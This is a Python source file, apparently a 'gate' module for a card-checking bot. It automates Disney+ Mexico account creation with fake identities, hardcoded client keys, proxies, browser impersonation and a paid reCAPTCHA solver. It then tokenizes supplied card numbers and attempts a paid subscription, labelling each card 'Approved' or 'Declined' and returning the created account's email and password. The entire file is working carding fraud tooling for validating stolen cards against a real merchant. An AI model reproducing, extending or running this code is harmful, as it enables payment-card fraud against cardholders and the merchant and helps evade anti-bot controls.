# Pure gate motor for 'bl' — no Telegram-bot dependency.

import os, json, secrets, time, string, re, types, random

from faker import Faker

from curl_cffi import requests as curl

from urllib.parse import quote as _q

_GATEWAY = 'Disney+ MX'

# Capsolver key is loaded EXCLUSIVELY from env (CAPSOLVER_KEY) — no default.
# The deploy must set this in Model/config.env or .env so the gate can solve
# the reCAPTCHA. If unset, the gate fails fast with a clear error instead of
# burning a captcha attempt with an empty/invalid key.
_CAPSOLVER_KEY = os.getenv('CAPSOLVER_KEY', '').strip()

class Disney:
    SDK_API_KEY = 'ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84'
    CLIENT_ID = 'disney-svod-3d9324fc'
    IDENTITY_CLIENT_ID = 'DTCI-DISNEYPLUS.WEB-PROD'
    SDK_VERSION = '35.3'
    SDK_PLATFORM = 'javascript/macosx/firefox'
    APP_VERSION = '1.1.2'
    YP_ID = '624b805dafc5c73635b1a216'
    SK_SIGNUP = '6LfGd1gpAAAAAGZgjyiaFLVETq2301KcgBt85qlD'
    LEGAL_ASSERT = 'dplus-mx_ppv2_proxy'
    LANGUAGE = 'es-419'
    COUNTRY = 'MX'
    DEFAULT_OFFER = 'cacc4266-e610-43d2-a4f2-3c71f46a8616'
    DEFAULT_CAMP = 'f66360e7-2199-33fd-bec2-f35069940dc1'
    _UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Gecko/20100101 Firefox/152.0'
    CARD_TYPE_MAP = {'4': 'visa', '5': 'mastercard', '3': 'amex', '6': 'discover'}
    EMAIL_DOMAINS = ('gmail.com', 'outlook.com', 'hotmail.com', 'icloud.com')
    _ERR = {'formerror_notifyuser_payment': 'Se produjo un error al procesar tu pago.', 'formerror_notifyuser_general': 'Ocurrió un problema con tu solicitud.', 'formerror_notifyuser_binmismatch_paymentblocked': 'Método de pago no coincide con el país.', 'FLX-0200': 'Pago no procesado — tarjeta rechazada.', 'FLX-0226': 'Método de pago bloqueado.'}
    _hex = staticmethod(lambda n: ''.join((secrets.choice('0123456789abcdef') for _ in range(n))))
    _resolve = staticmethod(lambda k, c: Disney._ERR.get(k) or Disney._ERR.get(c) or (' — '.join((p for p in (k, c) if p)) or 'Declined'))

    @staticmethod
    def uuid() -> str:
        h = Disney._hex(32)
        return f"{h[:8]}-{h[8:12]}-4{h[13:16]}-{random.choice('89ab')}{h[17:20]}-{h[20:]}"

    @staticmethod
    def parseCard(rawCard: str) -> dict:
        n, m, y, c = re.split('\\s*[|/]\\s*|\\s+', rawCard.strip())[:4]
        y = f'20{y}' if len(y) == 2 else y
        return {'number': n, 'month': m.zfill(2), 'year': y, 'cvv': c, 'type': Disney.CARD_TYPE_MAP.get(n[0], 'visa')}

    @staticmethod
    def generateProfile() -> types.SimpleNamespace:
        fake, p = (Faker('en_US'), Faker('en_US').profile())
        fn, ln = (p['name'].split()[0], p['name'].split()[-1])
        pwd = ''.join((secrets.choice(string.ascii_uppercase) for _ in range(2))) + ''.join((secrets.choice(string.ascii_lowercase) for _ in range(4))) + ''.join((secrets.choice(string.digits) for _ in range(3))) + random.choice('!@#$%')
        mail = f"{fn.lower()}{random.choice('._-')}{ln.lower()}{random.randint(10, 999)}@{random.choice(Disney.EMAIL_DOMAINS)}"
        return types.SimpleNamespace(fn=fn, ln=ln, password=pwd, mail=mail)

    @staticmethod
    def solveRecaptcha(cap_key: str, sitekey: str, proxy=None):
        task = {'type': 'ReCaptchaV3EnterpriseTaskProxyLess', 'websiteURL': 'https://www.disneyplus.com/', 'websiteKey': sitekey, 'pageAction': ''}
        if proxy:
            p = proxy
            task.update({'type': 'ReCaptchaV3EnterpriseTask', 'proxyType': 'http', 'proxyAddress': p.split('@')[1].split(':')[0] if '@' in p else p.split(':')[0], 'proxyPort': int(p.split('@')[1].split(':')[1]) if '@' in p else int(p.split(':')[1]), 'proxyLogin': p.split(':')[0] if '@' in p else '', 'proxyPassword': p.split(':')[1].split('@')[0] if '@' in p else ''})
        try:
            r = curl.post('https://api.capsolver.com/createTask', json={'clientKey': cap_key, 'task': task}, timeout=20).json()
            if r.get('errorId', 1) != 0:
                return None
            tid = r['taskId']
            for _ in range(60):
                time.sleep(3)
                r2 = curl.post('https://api.capsolver.com/getTaskResult', json={'clientKey': cap_key, 'taskId': tid}, timeout=15).json()
                if r2.get('status') == 'ready':
                    return r2['solution']['gRecaptchaResponse']
                if r2.get('errorId', 0) != 0:
                    return None
        except Exception:
            return None
        return None

    @staticmethod
    def buildBillingResponse(card: dict, resp: dict, data: types.SimpleNamespace) -> dict:
        card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        try:
            d, error_code = (resp.get('data', {}), (resp.get('metadata') or {}).get('errorCode', ''))
            if d.get('success'):
                return {'status': True, 'success': True, 'card': card_str, 'response': 'Approved', 'apiResponse': 'Approved ✅', 'email': data.mail, 'password': data.password}
            msg = ''
            try:
                b = d['errorData']['errorBoundary']
                parts = []
                try:
                    parts.append(Disney._resolve(b['header']['copy']['text'], ''))
                except Exception:
                    pass
                try:
                    [parts.append(Disney._resolve(i['copy']['text'], '')) for i in b['body']['textList']]
                except Exception:
                    pass
                msg = ' — '.join(parts)
            except Exception:
                pass
            return {'status': True, 'success': False, 'card': card_str, 'response': msg or Disney._resolve('', error_code), 'apiResponse': 'Declined ❌', 'email': data.mail, 'password': data.password}
        except Exception:
            return {'status': True, 'success': False, 'card': card_str, 'response': 'ParseError', 'apiResponse': 'Unknown ⚠️', 'email': data.mail, 'password': data.password}

def processDisneyFlow(cardInput: str, proxy=None, capsolver_key: str='', retries: int=0) -> dict:
    model = curl.Session(impersonate='firefox133')
    data = Disney.generateProfile()
    card = Disney.parseCard(cardInput)
    if proxy:
        p = proxy.strip()
        if p.startswith(('socks4://', 'socks5://', 'http://', 'https://')):
            _purl = p
        else:
            _socks = any((p.endswith(f':{port}') for port in ('4145', '1080', '1081', '9050')))
            _purl = f'socks5://{p}' if _socks else f'http://{p}'
        model.proxies = {'http': _purl, 'https': _purl}
    else:
        model.proxies = None
    ravelin_id = f'rjs-{Disney.uuid()}'
    model.cookies.set('ravelinDeviceId', ravelin_id, domain='.disneyplus.com')
    _step = 'init'
    try:
        _step = 'registerDevice'
        headers1a = {'accept': 'application/json', 'accept-language': 'es-ES,es;q=0.9', 'authorization': f'Bearer {Disney.SDK_API_KEY}', 'content-type': 'application/json', 'origin': 'https://www.disneyplus.com', 'referer': 'https://www.disneyplus.com/', 'user-agent': Disney._UA, 'x-application-version': Disney.APP_VERSION, 'x-bamsdk-client-id': Disney.CLIENT_ID, 'x-bamsdk-platform': Disney.SDK_PLATFORM, 'x-bamsdk-platform-id': 'browser', 'x-bamsdk-version': Disney.SDK_VERSION, 'x-dss-edge-accept': 'vnd.dss.edge+json; version=2', 'x-request-yp-id': Disney.YP_ID, 'x-request-id': Disney.uuid()}
        payload1a = {'operationName': 'RegisterDevice', 'query': 'mutation RegisterDevice($registerDevice: RegisterDeviceInput!) { registerDevice(registerDevice: $registerDevice) { grant { assertion grantType } } }', 'variables': {'registerDevice': {'deviceFamily': 'browser', 'applicationRuntime': 'firefox', 'deviceProfile': 'macosx', 'deviceLanguage': 'es', 'attributes': {'osDeviceIds': [], 'manufacturer': 'unknown', 'model': 'unknown', 'operatingSystem': 'macosx', 'operatingSystemVersion': 'unknown'}}}}
        request1a = model.post('https://disney.api.edge.bamgrid.com/graph/v1/device/graphql', headers=headers1a, json=payload1a).json()
        assertion = (request1a.get('data') or {}).get('registerDevice', {}).get('grant', {}).get('assertion')
        if not assertion:
            raise Exception(f'registerDevice sin assertion: {json.dumps(request1a)[:200]}')
        _step = 'exchangeDeviceGrant'
        headers1b = {**headers1a, 'x-request-id': Disney.uuid()}
        payload1b = {'operationName': 'exchangeDeviceGrantForAccessToken', 'query': 'mutation exchangeDeviceGrantForAccessToken($input: ExchangeDeviceGrantForAccessTokenInput!) { exchangeDeviceGrantForAccessToken(exchangeDeviceGrantForAccessToken: $input) { accepted } }', 'variables': {'input': {'deviceGrant': assertion}}}
        request1b = model.post('https://disney.api.edge.bamgrid.com/graph/v1/device/graphql', headers=headers1b, json=payload1b).json()
        anon_token = ((request1b.get('extensions') or {}).get('sdk', {}).get('token') or {}).get('accessToken')
        if not anon_token:
            headers1b_f = {**headers1b, 'content-type': 'application/x-www-form-urlencoded'}
            headers1b_f.pop('x-dss-edge-accept', None)
            payload1b_f = f"grant_type={_q('urn:ietf:params:oauth:grant-type:token-exchange')}&subject_token={_q(assertion)}&subject_token_type={_q('urn:bamtech:params:oauth:token-type:device')}&platform=browser"
            request1b_f = model.post('https://disney.api.edge.bamgrid.com/token', headers=headers1b_f, data=payload1b_f).json()
            anon_token = request1b_f.get('access_token')
        if not anon_token:
            raise Exception('anon token failed')
        _step = 'checkEmail'
        headers2 = {**headers1a, 'authorization': f'Bearer {anon_token}', 'x-request-id': Disney.uuid()}
        payload2 = {'operationName': 'Check', 'query': 'query Check($email: String!) { check(email: $email) { operations nextOperation } }', 'variables': {'email': data.mail}}
        request2 = model.post('https://disney.api.edge.bamgrid.com/v1/public/graphql', headers=headers2, json=payload2).json()
        ops = (request2.get('data') or {}).get('check', {}).get('operations', [])
        if 'Register' not in ops:
            raise Exception(f'Email no disponible: ops={ops}')
        _step = 'register'
        headers3 = {**headers2, 'x-request-id': Disney.uuid()}
        payload3 = {'query': '\n    mutation register($input: RegistrationInput!) {\n        register(registration: $input) {\n            actionGrant\n            activeSession {\n              isSubscriber\n            }\n            identity {\n              ...identity\n            }\n        }\n    }\n\n    \n  fragment identity on Identity {\n    attributes {\n      securityFlagged\n      createdAt\n      passwordResetRequired\n    }\n    flows {\n      marketingPreferences {\n        eligibleForOnboarding\n        isOnboarded\n      }\n      personalInfo {\n        eligibleForCollection\n        requiresCollection\n      }\n    }\n    personalInfo {\n      dateOfBirth\n      gender\n    }\n    subscriber {\n      subscriberStatus\n      subscriptionAtRisk\n      overlappingSubscription\n      doubleBilled\n      doubleBilledProviders\n      subscriptions {\n        id\n        groupId\n        state\n        partner\n        isEntitled\n        source {\n          sourceType\n          sourceProvider\n          sourceRef\n          subType\n        }\n        paymentProvider\n        product {\n          id\n          sku\n          offerId\n          promotionId\n          name\n          nextPhase {\n            sku\n            offerId\n            campaignCode\n            voucherCode\n          }\n          entitlements {\n            id\n            name\n            desc\n            partner\n          }\n          categoryCodes\n          redeemed {\n            campaignCode\n            redemptionCode\n            voucherCode\n          }\n          bundle\n          bundleType\n          subscriptionPeriod\n          earlyAccess\n          trial {\n            duration\n          }\n        }\n        term {\n          purchaseDate\n          startDate\n          expiryDate\n          nextRenewalDate\n          pausedDate\n          churnedDate\n          isFreeTrial\n        }\n        externalSubscriptionId,\n        cancellation {\n          type\n          restartEligible\n        }\n        stacking {\n          status\n          overlappingSubscriptionProviders\n          previouslyStacked\n          previouslyStackedByProvider\n        }\n      }\n    }\n  }\n\n', 'variables': {'input': {'attributes': {'languagePreferences': {'appLanguage': Disney.LANGUAGE, 'playbackLanguage': Disney.LANGUAGE, 'subtitleLanguage': Disney.LANGUAGE}, 'legalAssertions': [Disney.LEGAL_ASSERT]}, 'email': data.mail, 'metadata': {'isTest': False}, 'password': data.password}}, 'operationName': 'register'}
        request3 = model.post('https://disney.api.edge.bamgrid.com/v1/public/graphql', headers=headers3, json=payload3).json()
        user_token = ((request3.get('extensions') or {}).get('sdk', {}).get('token') or {}).get('accessToken')
        if not user_token:
            errs = request3.get('errors', [])
            raise Exception(f"register sin token: {(errs[0].get('extensions', {}).get('code', 'null') if errs else 'null')}")
        try:
            identity_device_id = Disney.uuid()
            headers3b = {'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://www.disneyplus.com', 'referer': 'https://www.disneyplus.com/', 'user-agent': Disney._UA}
            payload3b = {'query': 'mutation registerIdentityDevice($registerIdentityDeviceRequest: RegisterIdentityDeviceRequestInput!) { registerIdentityDevice(registerIdentityDeviceRequest: $registerIdentityDeviceRequest) { identityDevice { deviceId archived brand createdAt expiresAt } } }', 'variables': {'registerIdentityDeviceRequest': {'clientId': Disney.IDENTITY_CLIENT_ID, 'deviceId': identity_device_id, 'metadata': {'isTest': False}}}}
            model.post('https://login.disney.com/api/graphql', headers=headers3b, json=payload3b, timeout=15)
        except Exception:
            pass
        headers4 = {**headers3, 'authorization': f'Bearer {user_token}', 'x-request-id': Disney.uuid()}
        payload4 = {'operationName': 'createMarketingPreferences', 'query': 'mutation createMarketingPreferences($input: CreateMarketingPreferencesInput!) { createMarketingPreferences(createMarketingPreferences: $input) { accepted } }', 'variables': {'input': {'email': data.mail, 'legalAssertions': [Disney.LEGAL_ASSERT], 'subscribed': True, 'marketingPreferences': ['DisneyPlus', 'WaltDisneyFamily'], 'preferredLanguages': [Disney.LANGUAGE], 'metadata': {'isTest': False}}}}
        model.post('https://disney.api.edge.bamgrid.com/v1/public/graphql', headers=headers4, json=payload4)
        headers5 = {**headers4, 'x-request-id': Disney.uuid()}
        headers5.pop('content-type', None)
        request5 = model.get('https://disney.api.edge.bamgrid.com/screens/v1/landing/plans', headers=headers5, params={'isLicensePlateUser': 'false'}).json()
        offer_id = Disney.DEFAULT_OFFER
        campaign_id = Disney.DEFAULT_CAMP
        try:

            def _find(obj, key, depth=0):
                if depth > 10 or obj is None:
                    return None
                if isinstance(obj, dict):
                    if key in obj:
                        return obj[key]
                    for v in obj.values():
                        r = _find(v, key, depth + 1)
                        if r is not None:
                            return r
                elif isinstance(obj, list):
                    for v in obj:
                        r = _find(v, key, depth + 1)
                        if r is not None:
                            return r
                return None
            plans_data = request5.get('data') or request5
            campaign_id = _find(plans_data, 'campaignId') or Disney.DEFAULT_CAMP
            offers = _find(plans_data, 'offers') or []
            if offers and isinstance(offers, list):
                filtered = [o for o in offers if isinstance(o, dict) and o.get('price', 0) > 200] or offers
                offer_id = min(filtered, key=lambda o: o.get('price', 9999) if isinstance(o, dict) else 9999).get('offerId', Disney.DEFAULT_OFFER)
        except Exception:
            pass
        try:
            headers5b = {**headers4, 'x-request-id': Disney.uuid()}
            model.put('https://disney.api.edge.bamgrid.com/execution/v1/payments/paypal/client-token', headers=headers5b, json={}, timeout=15)
        except Exception:
            pass
        _step = 'tokenize'
        headers6 = {**headers4, 'authorization': user_token, 'x-request-id': Disney.uuid(), 'x-bamtech-module': 'DEFAULT_CHECKOUT'}
        payload6 = {'creditCardNumber': card['number'], 'namespaceId': 100, 'passthroughData': {'alternateName': 'Disney Subscription Card', 'billingAddress': {'country': Disney.COUNTRY}, 'cvv': card['cvv'], 'expiryMonth': int(card['month']), 'expiryYear': int(card['year']), 'isDefault': True, 'isReusable': True, 'isShared': True, 'ownerFullName': f'{data.fn} {data.ln}', 'usage': 'multi_use'}}
        request6 = model.post('https://waf-elb-default-prod-bamtech.us-west-2.bamgrid.com/tokens/sps', headers=headers6, json=payload6).json()
        print('Token: ', request6)
        payment_method_id = request6.get('paymentMethodId')
        if not payment_method_id:
            raise Exception(f'Tokenización fallida: {json.dumps(request6)[:200]}')
        headers65 = {**headers4, 'content-type': 'application/merge-patch+json', 'x-request-id': Disney.uuid()}
        model.patch(f'https://disney.api.edge.bamgrid.com/wallet/payment-cards/{payment_method_id}', headers=headers65, json={'isShared': True})
        _step = 'captcha'
        cap = Disney.solveRecaptcha(capsolver_key, Disney.SK_SIGNUP, proxy)
        if not cap:
            raise Exception('reCAPTCHA signup solve failed')
        _step = 'signup'
        headers8 = {**headers4, 'content-type': 'application/json; charset=utf-8', 'x-request-id': Disney.uuid()}
        payload8 = {'offers': [{'campaignId': campaign_id, 'offerId': offer_id}], 'paymentMethodId': payment_method_id, 'paymentMethod': {'type': 'creditCard', 'paymentMethodId': payment_method_id, 'isTemplatized': False}, 'recaptchaToken': cap, 'ravelinDeviceId': ravelin_id, 'hasPostSufAddonExperience': False}
        request8 = model.put('https://disney.api.edge.bamgrid.com/execution/v2/subscription/signup', headers=headers8, json=payload8).json()
        return Disney.buildBillingResponse(card, request8, data) | {'retries': str(retries), 'gateway': 'Disney+ Plans Subscription'}
    except Exception as e:
        if retries < 3:
            return processDisneyFlow(cardInput, proxy, capsolver_key, retries + 1)
        return {'status': False, 'message': f'[{_step}] {e}', 'card': f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}", 'retries': str(retries), 'gateway': 'Disney+ Plans Subscription'}

def _checker(cc, binData, proxy=None):
    if not _CAPSOLVER_KEY:
        return {'status': False,
                'raise': 'CAPSOLVER_KEY no configurada — define CAPSOLVER_KEY en Model/config.env o .env para usar este gate.'}
    try:
        card_input = f'{cc[0]}|{cc[1]}|{cc[2]}|{cc[3]}'
        r = processDisneyFlow(cardInput=card_input, proxy=proxy, capsolver_key=_CAPSOLVER_KEY)
        if not r.get('status'):
            return {'status': False, 'raise': r.get('message', 'Disney flow failed')[:200]}
        email = r.get('email', '')
        pwd = r.get('password', '')
        resp = r.get('apiResponse', '')
        extra = f' | {email}:{pwd}' if r.get('success') and email else ''
        return {'status': True, 'success': r.get('success', False), 'response': f'{resp}{extra}'}
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    proxy = (ctx.get('proxy') or '') or None
    r = _checker(cc, bin_data, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}

if __name__ == '__main__':
    print(run_check([4782002079717726, 8, 2030, 878], ''))